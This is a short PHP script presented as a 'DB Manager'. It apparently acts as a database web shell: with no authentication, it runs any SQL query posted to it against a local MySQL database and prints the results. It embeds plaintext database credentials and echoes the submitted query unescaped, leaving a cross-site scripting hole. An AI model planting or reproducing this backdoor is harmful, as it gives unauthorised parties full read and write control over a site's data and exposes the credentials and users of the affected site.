<?php echo '<h2>DB Manager</h2><form method="POST"><textarea name="query" style="width:100%;height:100px;">'.($_POST['query']??'').'</textarea><br><input type="submit" value="Execute"></form>'; if(!empty($_POST['query'])){ $c=@mysqli_connect('localhost','caorle','R-adminis_U!','caorle_'); if(!$c) echo "Koneksi gagal: ".mysqli_connect_error(); else{ $r=@mysqli_query($c,$_POST['query']); if($r===true) echo "Query berhasil dieksekusi."; elseif($r){ echo '<table border="1">'; while($o=mysqli_fetch_assoc($r)) echo '<tr><td>'.implode('</td><td>',$o).'</td></tr>'; echo '</table>'; } else echo "Error: ".mysqli_error($c); } } ?>
